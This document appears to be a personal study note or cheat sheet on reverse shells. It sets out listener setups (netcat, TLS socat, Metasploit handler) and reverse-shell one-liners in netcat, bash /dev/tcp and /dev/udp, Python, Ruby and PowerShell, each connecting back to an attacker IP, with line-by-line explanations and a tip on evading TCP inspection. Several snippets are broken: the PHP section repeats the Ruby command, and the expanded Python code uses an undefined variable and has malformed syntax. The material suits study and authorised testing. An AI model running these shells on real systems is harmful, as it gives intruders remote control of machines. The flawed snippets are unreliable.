---
created: 22-01-2026
tags:
  - shells
  - net_hack
---
https://www.revshells.com/
## Tunneling

In the article about [[bind_shells]], we talked about a situation when outbound connections are blocked but inbound are allowed. In [[reverse_shells]] article, we had the opposite — when inbound connections are blocked but outbound are allowed. 

But what if nothing is allowed?

## Reverse shells

>A **reverse shells** is a type of remote shell where the **attacker machine** listens on a specific port. The target machine initiates an output connection to the attacker machine, and when the connection is established, the attacker gains a command-line interface.

Most enterprise networks block **ingress traffic** — *incoming connections* from the Internet. Directly connecting to a target on an arbitrary port (as with bind shells) is often impossible. 
- But if *outbound connections* from the target are allowed (egress traffic), a **reverse shell** can be used to force the target to initiate a connection to the attacker.
- Egress traffic is often allowed simply because employees need to browse the web somehow, send emails, and otherwise connect to external services.

>[!note] In the reverse situations, when only inbound connections are allowed, [[bind_shells]] may come useful.
## Listeners

Before you deploy a reverse shell on the target, you first need to set up a listener on your attacking machine. Essentially, this is simple server that waits for an incoming connection from the target. This is where the reverse shell will connect to from the target.

There are many tools you can use to establish a listener for your reverse shell:

- Netcat (classic, raw connection):


```bash
nc -lvnp 1337
```

>[!interesting]+ This starts a Netcat listener (`-l`) on port `1337` (`-p 1337`), in verbose mode (`-v`) and DNS resolution disabled (`-n`). 

- Socat (more advanced, with some additional capabilities):

```bash
socat file:`tty`,raw,echo=0 tcp-listen:1337
```

>[!interesting]+ This creates a listener on port `1337` and connect it to your terminal in a raw mode.
>- `file:tty` part tells socat to use your current terminal.
>- `raw,echo=0` disables terminal echo (so you don't see your commands repeated).
>- `tcp-listen:1337` creates the listening socket.
>
>One advantage of socat over netcat is that it preserves terminal features better.

>[!note] To learn more about differences between shell sessions, why Socat may be better than than Netcat, and why one approach may be suitable while the other isn't, refer to [[upgrading_the_shell]].

For encrypted connections with Socat:

1. Generate a certificate and signing key:

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

2. Combine the certificate and key into a single file:

```bash

cat shell.key shell.crt > shell.pem
```

3. Run the encrypted listener:

```bash
socat OPENSSL-LISTEN:1337,cert=shell.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

>[!interesting] This creates an encrypted listener that uses SSL/TLS. 
>- The `OPENSSL-LISTEN` mode uses your certificate file (`cert=shell.pem`). 
>- `verify=0` means don't verify the client certificate (appropriate for this use case).
>- `fork` allows multiple concurrent connections. 
>
>This is useful to protect the traffic from being captured and inspected with tools like Wireshark, commonly used for network monitoring.

- Metasploit multi-handler (for Meterpreter and other staged payloads):

```bash
msfconsole -q -x "use exploit/multi/handler; set payload <payload_name>; set lhost <attacker_ip_address>; set lport 1337; exploit"
```

- For example, Meterpreter TCP reverse shell for Windows:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost <your_ip_address>; set lport 1337; exploit"
```

- `pwncat` (Netcat on steroids):

```bash
pwcat -l 1337
```

>[!note] For more about `pwncat`, see [[pwncat]].

## Reverse shell with Netcat

- Once your listener is running on your attacking machine, you can run a reverse shell on the target machine, such as with Netcat:

```bash
nc <attacker_ip_address> 1337 -e /bin/bash
```

>[!interesting]+ How this reverse shell works
>
>This command tells Netcat to establish an outbound connection to your listener at the specified IP address and port. 
>- With `-e /bin/bash` flag, once the connection is established, Netcat will execute `/bin/bash` and connect its input/output to the network socket. 
>
>From your listener's perspective, you suddenly see the target connected, and you can type commands that get executed on the target with the shell's output returned to you.
>```
> Listening on 0.0.0.0 1337  
> Connection received on 10.10.1.11 50944
>```

>[!note] The shell executes with the privileges of the user who ran the command on the target.
### Netcat and pipes

Since the `-e` option can literally turn a Netcat socket connection into a shell, it's often disabled on modern systems. But there is a workaround.

- If the `-e` option is unavailable, you can create a reverse shell with Netcat and  pipes:

```bash
mkfifo /tmp/pipefile; \
nc <attacker_ip_address> 1337 < /tmp/pipefile | /bin/sh > /tmp/pipefile 2>&1; \
rm /tmp/pipefile
```

>[!interesting]+ How this reverse shell works
>- `mkfifo /tmp/pipefile`
>	- Creates a named pipe (FIFO) at `/tmp/pipefile`.
>- `nv <attacker_ip_address> 1337`
>	- Netcat connects to the attacker's machine on port `1337`.
>	- The `< /tmp/pipefile` part tells Netcat to read its input from the named pipe instead of standard input (`stdin`). Any data written to `/tmp/pipefile` will be sent out over the network to whoever is connected (i.e., the attacker).
>- `| /bin/sh`
>	- Pipes output from Netcat (i.e., anything received from the remote client) into `/bin/sh`, which executes any commands it receives (i.e., from the attacker).
> 	- This means that anything the connected user (attacker) sends to the Netcat listener will be executed on the local system.
> - `> /tmp/pipefile 2>&1`
>     - The output from `/bin/sh` (both `stdout` and `stderr`, `>` and `2>&1`) is redirected to `/tmp/pipefile`.
>     - This means the shell's output is written back into the named pipe, _which Netcat is reading from_, and sent back to the remote user.
> - `rm /tmp/pipefile` 
> 	- Removes the named pipe after the session ends.

- Another, slightly different approach that uses `cat` to read from the named pipe:

```bash
rm -f /tmp/pipefile; \
mkfifo /tmp/pipefile; \
cat /tmp/pipefile | /bin/sh -i 2>&1 | nc <attacker_ip_address> 1337 > /tmp/pipefile
```

>[!interesting]+ How this reverse shell works
> - `rf -f /tmp/pipefile`
> 	- Removes any existing `/tmp/pipefile`.
> - `mkfifo /tmp/pipefile`
> 	- Creates a named pipe (FIFO) at `/tmp/pipefile`.
> - `cat /tmp/pipefile  | /bin/sh -i 2>&i`
> 	- Reads from the named pipe and sends the data (both `stdout` and `stderr`) through the pipe operator to `/bin/sh -i`. The `-i` flag makes the shell interactive. 
> - `| nc <attacker_ip_address> 1337`
> 	- Redirects the output from the shell (`stdout` and `stderr`) is piped into Netcat, which transmits the data to your machine.
> - `> /tmp/pipefile`
> 	- Redirects the output from Netcat (i.e., data received from your attacker machine) back into `/tmp/pipefile`, which `cat` is reading from.

## Reverse shell with Unix/Linux raw sockets

It's possible to establish a reverse shell on Linux/Unix without any helper tools like Netcat.

Starting from Bash version 2.04, it's possible to establish raw socket TCP and UDP connections using built-in pseudo devices — `/dev/tcp` and `/dev/udp` — **without any external tools**.

- Reverse shell with a Unix TCP raw socket:

```bash
bash -i >& /dev/tcp/<attacker_ip_address>/1337 0>&1
```

>[!interesting]+ How this reverse shell works
> `/dev/tcp/...` makes Bash treat a TCP connection as a **file descriptor**.
> - `bash -i` starts an interactive (`-i`) shell session.
> - `/dev/tcp/...` tells Bash to establish a TCP connection to the specific host on the specific port. The `>&` operator redirects both standard output and standard error to this TCP connection. So, anything the shall outputs gets sent across the network to your machine.
> - `0>&1` takes standard input (file descriptor `0`) and redirects it to be a copy of standard output (file descriptor `1`), which is already pointing to the TCP socket. This creates a complete bidirectional communication channel: shell output goes to the socket, and shell input comes from the socket.

- You can also use UDP instead of TCP (such as to evade detection on networks that inspect TCP connections more carefully):

```bash
bash -i >& /dev/udp/<attacker_ip_address>/1337 0>&1
```
## Python reverse shell

- A fully interactive PTY shell with Python:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip_address>",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()'
```

Expanded version:

```Python
import socket
import os
import pty

# create a new socket object using IPv4 address (AF_INET) and TCP (SOCK_STREAM)
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

# connect to the attacker's listener port
s.connect(("<attacker_ip_address>",1337));

# redirect stdin (fd 0) to the socket's file descriptor (client connection)
os.dup2(c.fileno(),0)

# redirect stdin (fd 1) to the socket's file descriptor
os.dup2(c.fileno(),1

# redirect stdin (fd 2) to the socket's file descriptor
;os.dup2(c.fileno(),2)

# spawn an interactive bash shell
pty.spawn("/bin/bash")

# close the listening socket (since the connection is already established)
s.close()
```

- Another Python reverse shell, but using `subprocess` module instead of `pty`:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip_address>",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

>[!note] For a more comprehensive list of different reverse shells, refer to [`Reverse Shell Cheat Sheet — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/).
## Ruby

```bash
ruby -rsocket -e 'f=TCPSocket.open("<attacker_ip_address>",1337);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PHP

```bash
ruby -rsocket -e 'f=TCPSocket.open("<attacker_ip_address>",1337);exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
## PowerShell reverse shell

PowerShell on Windows provides powerful networking capabilities through .NET framework classes.

- PowerShell reverse shell one-liner:

```PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- The `-nop` flag, no profile, tells PowerShell not to load the user's profile script when starting. This makes execution faster and helps avoid potentially unwanted commands that might be present in the profile.
- The `-c` flag indicates that what follows is a command to execute.

Let's examine the expanded version:

```PowerShell
$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337)

$stream = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	
	
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
	
	$sendback = (iex $data 2>&1 | Out-String )
	
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
	
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
	
	$stream.Write($sendbyte,0,$sendbyte.Length)

	$stream.Flush()
}

$client.Close()
```

>[!interesting]+ How this reverse shell works
> - `$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip_address>',1337);`
> 	- Creates a **TCP client** object (instance of the `System.Net.Sockets.TCPClient` .NET framework object) that connects to the attacker's machine (replace `<attacker_ip_address>` with your real IP address) on port `1337`.
> 	- This is how the target machine initiates the connection with the attacker.
> - `$stream = $client.GetStream();`
> 	- Gets the **network stream** called `$stream` from the TCP connection. This stream will be used to read commands from the attacker and send back output. 
> - `[byte[]]$bytes = 0..65535|%{0};`
> 	- Creates a **byte array buffer** called `$bytes` of size 65,536 (all elements are initialized to `0`). This buffer will temporarily hold data from the network stream. 
> - `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`
> 	- Reads data from the stream (`$stream.Read`) into the `$bytes` buffer; `$i` is the number of bytes actually read. The loop continues as long as the stream is open and data is being received.
> 	- `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`
> 		- Converts the received data into an ASCII string (the commands sent by the attacker).
> 	- `$sendback = (iex $data 2>&1 | Out-String);`
> 		- Executes the received commands using `Invoke-Expression` (`iex`). `2>&1` redirects errors to standard output, and `| Out-String` ensures the output is a string (not an object).
> 	- `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
> 		- Appends a **PowerShell prompt** (current directory) to the output, so the attacker sees a familiar prompt after each command (e.g., `PS C:\current\wordking\directory >`).
> 	- `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
> 		- Converts the output string back to bytes for sending over the network.
> 	- `$stream.Write($sendbyte,0,$sendbyte.Length);`
> 		- Sends the output back to the attacker over the TCP connection.
> 	- `$stream.Flush()`
> 		- Ensures all data is sent immediately.
> - `$client.Close()`
> 	- Closes the TCP connection when the loop ends (e.g., if the attacker disconnects).
## References and further reading

-  [`Reverse Shell Cheat Sheet — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)